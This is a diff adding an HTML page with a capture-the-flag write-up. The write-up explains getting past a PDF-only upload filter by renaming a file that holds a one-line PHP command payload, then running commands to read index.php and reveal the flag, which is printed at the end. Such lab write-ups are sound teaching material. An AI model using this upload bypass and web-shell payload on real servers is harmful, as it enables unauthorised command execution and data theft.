@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <link rel="stylesheet" href="../../css/Font.css">
+        <link rel="stylesheet" href="css/folderview.css">
+        <script src="js/folderview.js"></script>
+    </head>
+    <body>
+        <pre>
+            Flag safe in the server environment , can you reveal it.
+
+            This challenge was a bit tricky but after doing some research I was able to come up with the solution.
+            Comment
+
+            We can see that there is a place to upload files but only .pdf files are allowed
+
+            <img src="/public/images/Web Security/JOIN TEAM/JOIN TEAM-1.png"/>
+
+            So I did the following;
+
+            <code>
+            ┌──(ali㉿Kali)-[~]
+            └─$ echo "<?php system('ls'); ?>" >test.txt
+
+            ┌──(ali㉿Kali)-[~]
+            └─$ mv test.txt test.pdf
+            </code>
+
+            I uploaded the test.pdf and magic!! It was successfully uploaded.
+
+            <img src="/public/images/Web Security/JOIN TEAM/JOIN TEAM-2.png"/>
+
+            So I clicked on the test.pdf and i noticed something at the url…
+
+            <img src="/public/images/Web Security/JOIN TEAM/JOIN TEAM-3.png"/>
+
+            I saw the /data/test.pdf so I copied as follows;
+
+            <img src="/public/images/Web Security/JOIN TEAM/JOIN TEAM-4.png"/>
+
+            I edited the php code as follows;
+
+            <code>
+                <? php system('cat index.php'); ?>
+            </code>
+
+            After that we get the flag.
+
+        </pre>
+
+        <h2><i>
+        hiddenenvironflag    
+        </i></h2>
+    </body>
+</html>
